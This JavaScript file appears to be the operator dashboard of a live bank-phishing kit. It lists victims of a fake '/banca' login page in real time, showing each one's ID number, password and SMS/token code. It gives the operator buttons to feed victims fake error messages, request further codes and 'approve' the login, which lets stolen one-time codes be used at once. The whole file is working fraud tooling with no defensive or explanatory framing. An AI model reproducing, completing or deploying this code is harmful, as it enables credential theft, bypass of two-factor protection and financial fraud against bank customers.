(function () {
  const socket = typeof io !== "undefined" ? io() : null;
  const container = document.getElementById("operator-sessions-list");
  const countBadge = document.getElementById("active-users-count");

  if (!socket) return;

  socket.emit("admin:join");

  socket.on("sessions:update", function (sessions) {
    if (countBadge) {
      countBadge.textContent = sessions.length;
    }
    if (!container) return;

    if (sessions.length === 0) {
      container.innerHTML = `
        <div class="empty-sessions">
          <p>⚡ No hay usuarios conectados en este momento.</p>
          <small>Los datos de los usuarios que accedan a <b>/banca</b> aparecerán aquí en tiempo real.</small>
        </div>
      `;
      return;
    }

    container.innerHTML = sessions.map((s) => `
      <div class="session-card glass-card" data-id="${s.id}">
        <div class="session-header">
          <div>
            <span class="status-badge ${s.step}">${s.status || s.step}</span>
            <small class="time-stamp">⏰ ${s.updatedAt || ""}</small>
          </div>
          <small class="ip-addr">🌐 ${s.ip || "127.0.0.1"}</small>
        </div>
        <div class="session-body">
          <div class="data-field">
            <label>📄 Documento (${s.docType || "DNI"}):</label>
            <span class="val-highlight">${s.docNumber || "—"}</span>
          </div>
          <div class="data-field">
            <label>🔑 Contraseña:</label>
            <span class="val-highlight pass">${s.password || "—"}</span>
          </div>
          <div class="data-field">
            <label>📱 Código SMS / Token:</label>
            <span class="val-highlight token">${s.token || "—"}</span>
          </div>
        </div>
        <div class="session-actions">
          <button class="cmd-btn btn-danger" onclick="sendCmd('${s.id}', 'wrong_doc', 'Documento incorrecto')">❌ Err. Doc</button>
          <button class="cmd-btn btn-warning" onclick="sendCmd('${s.id}', 'wrong_pass', 'Contraseña incorrecta')">🔑 Err. Clave</button>
          <button class="cmd-btn btn-warning" onclick="sendCmd('${s.id}', 'wrong_token', 'Token inválido')">📲 Err. SMS</button>
          <button class="cmd-btn btn-info" onclick="sendCmd('${s.id}', 'ask_pass', 'Pedir clave')">➡️ Ir a Clave</button>
          <button class="cmd-btn btn-info" onclick="sendCmd('${s.id}', 'ask_token', 'Pedir token')">📱 Pedir SMS</button>
          <button class="cmd-btn btn-success" onclick="sendCmd('${s.id}', 'approve', 'Aprobar')">✅ Aprobar Login</button>
        </div>
      </div>
    `).join("");
  });

  window.sendCmd = function (targetId, action, defaultMsg) {
    let message = defaultMsg;
    if (action.startsWith("wrong")) {
      const customMsg = prompt("Mensaje de error para el usuario:", defaultMsg);
      if (customMsg === null) return;
      message = customMsg;
    }
    socket.emit("admin:command", { targetId, action, message });
  };
})();
